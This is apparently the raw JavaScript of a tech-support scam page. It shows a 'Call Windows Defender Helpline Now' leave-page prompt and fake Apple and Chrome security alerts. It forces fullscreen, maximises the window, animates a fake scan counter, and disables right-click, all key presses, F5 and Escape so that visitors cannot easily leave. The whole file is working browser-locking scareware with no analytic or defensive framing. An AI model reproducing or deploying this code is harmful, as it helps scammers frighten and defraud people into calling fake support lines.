

      	
      	  window.onbeforeunload = function() {
      	     if (data_needs_saving()) {
      	         return "Call Windows Defender Helpline Now";
      	     } else {
      	        return;
      	     }
      	  };
      	          
      	          
      	              window.addEventListener("beforeunload", function (e) {
      	           var confirmationMessage = 'It looks like you are editing something. '
      	                              + 'Your changes will be lost if you leave before saving.';

      	                  (e || window.event).returnValue = confirmationMessage; //Gecko + IE
      	                  return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
      	              });
      	          
					

  $(document).ready(function() {
    $("#mycanvas").click(function() {
      $(".apple-footer").show()
      $(".apple-top").hide()
      $("#chat-box").show()
    })
  });


        $(document).ready(function() {
          $("body").mouseover(function() {
      $("#exit-popup").show()
      $(".apple-chat").show()
      $("#scansec").show()
          })
        });
  $(document).ready(function() {
    $("#mycanvas").click(function() {
      $("#chromealerts").show()
    })
  });

$("#mycanvas").click(function(){
    $(".apple-footer").css("opacity","1");
});
      
        (function(a) {
          a.fn.countTo = function(b) {
            b = b || {};
            return a(this).each(function() {
              function d(a) {
                a = c.formatter.call(k, a, c);
                h.html(a)
              }
              var c = a.extend({}, a.fn.countTo.defaults, {
                  from: a(this).data("from"),
                  to: a(this).data("to"),
                  speed: a(this).data("speed"),
                  refreshInterval: a(this).data("refresh-interval"),
                  decimals: a(this).data("decimals")
                }, b),
                l = Math.ceil(c.speed / c.refreshInterval),
                n = (c.to - c.from) / l,
                k = this,
                h = a(this),
                m = 0,
                f = c.from,
                g = h.data("countTo") || {};
              h.data("countTo", g);
              g.interval && clearInterval(g.interval);
              g.interval = setInterval(function() {
                f += n;
                m++;
                d(f);
                "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
                m >= l && (h.removeData("countTo"), clearInterval(g.interval), f = c.to, "function" == typeof c.onComplete && c.onComplete.call(k, f))
              }, c.refreshInterval);
              d(f)
            })
          };
          a.fn.countTo.defaults = {
            from: 0,
            to: 0,
            speed: 100,
            refreshInterval: 100,
            decimals: 0,
            formatter: function(a, d) {
              return a.toFixed(d.decimals)
            },
            onUpdate: null,
            onComplete: null
          }
        })(jQuery);
        jQuery(function(a) {
          a(".count-number").data("countToOptions", {
            formatter: function(a, d) {
              return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",")
            }
          });
          a(".timer").each(function(b) {
            var d = a(this);
            b = a.extend({}, b || {}, d.data("countToOptions") || {});
            d.countTo(b)
          })
        });
      

      
        addEventListener("click", function() {
      var el = document.documentElement
        , rfs =
               el.requestFullScreen
            || el.webkitRequestFullScreen
            || el.mozRequestFullScreen
      ;
      rfs.call(el);
      });
      
        var e = 1;
        setInterval(function() {
          1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
        }, 1E3);
      
      
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#welcomeDiv").show()

          })
        });
      
      
        $(document).ready(function() {
          $(".apple-blue-card").delay(5000).fadeIn(400);
          $(".apple-top").delay(1000).fadeIn(400);
          $("#boxNew").delay(500).fadeIn(400);
        });
      
      
        var isNS = "Netscape" == navigator.appName ? 1 : 0;
        "Netscape" == navigator.appName && document.captureEvents(Event.MOUSEDOWN || Event.MOUSEUP);

        function mischandler() {
          return !1
        }

        function mousehandler(a) {
          a = isNS ? a : event;
          a = isNS ? a.which : a.button;
          if (2 == a || 3 == a) return !1
        }
        document.oncontextmenu = mischandler;
        document.onmousedown = mousehandler;
        document.onmouseup = mousehandler;
      
      
        document.onkeydown = function(a) {
          return !1
        };
      
      
        document.attachEvent("onkeydown", win_onkeydown_handler);

        function win_onkeydown_handler() {
          switch (event.keyCode) {
            case 116:
              event.returnValue = !1;
              event.keyCode = 0;
              break;
            case 27:
              event.returnValue = !1, event.keyCode = 0
          }
        }
      
      
        window.onload = function() {
          window.moveTo(0, 0);
          window.resizeTo(screen.availWidth, screen.availHeight)
        };
      

$('body').click(function() {
    $('#txtBox').slideUp();
});
  
   
    